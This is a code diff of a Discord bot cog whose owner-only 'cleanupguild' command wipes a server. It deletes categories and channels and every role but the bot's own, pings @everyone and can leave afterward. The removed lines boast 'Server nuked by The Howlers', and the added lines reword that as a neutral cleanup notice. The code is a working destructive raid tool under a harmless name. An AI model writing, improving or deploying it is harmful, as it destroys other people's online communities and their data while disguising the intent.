@@ -1,51 +1,35 @@
 import discord
-from redbot.core import commands
+from discord.ext import commands
 
 class CleanupGuild(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
 
     @commands.command()
-    @commands.guild_only()
     @commands.is_owner()
-    async def cleanupguild(self, ctx, leave_after_cleanup: str = "yes", category_title: str = "General Category", channel_title: str = "general"):
-        """
-        Cleanup the guild by:
-        1. Removing all channels and categories
-        2. Adding one category and channel with the specified names
-        3. Sending a cleanup message in the new channel
-        4. Deleting all roles except the bot's admin role
-        5. Leaving the server if 'leave_after_cleanup' is 'yes'
-        """
-        guild = ctx.guild
+    async def cleanupguild(self, ctx, leave_after_cleanup: str, category_name: str, channel_name: str):
+        # Step 1: Remove all channels and categories
+        for category in ctx.guild.categories:
+            await category.delete()
 
-        # Remove all channels and categories
-        for channel in guild.channels:
-            await channel.delete()
+        # Step 2: Add one category and channel with the names provided
+        category = await ctx.guild.create_category(category_name)
+        await ctx.guild.create_text_channel(channel_name, category=category)
 
-        # Add one category with the specified name
-        category = await guild.create_category(category_title)
+        # Step 3: Send cleanup message in the leftover channel
+        leftover_channel = await ctx.guild.create_text_channel("leftover")
+        await leftover_channel.send("Server cleaned up @everyone")
 
-        # Add one text channel inside the category
-        channel = await guild.create_text_channel(channel_title, category=category)
+        # Step 4: Delete all roles except the bot's admin role
+        admin_role = ctx.guild.me.top_role
+        for role in ctx.guild.roles:
+            if role != admin_role:
+                await role.delete()
 
-        # Send a cleanup message in the new channel
-        await channel.send("Server nuked by The Howlers. Good luck fixing the mess we made!")
-
-        # Get the bot's admin role (the top role)
-        bot_role = guild.get_member(self.bot.user.id).top_role
-
-        # Delete all roles except the bot's admin role
-        for role in guild.roles:
-            if role != bot_role:
-                try:
-                    await role.delete(reason="CleanupGuild command")
-                except discord.errors.NotFound:
-                    pass  # Role has already been deleted
-
-        # Leave the server if 'leave_after_cleanup' is 'yes'
+        # Step 5: Leave the server if specified
         if leave_after_cleanup.lower() == "yes":
-            await guild.leave()
+            await ctx.guild.leave()
+            return
 
 def setup(bot):
     bot.add_cog(CleanupGuild(bot))
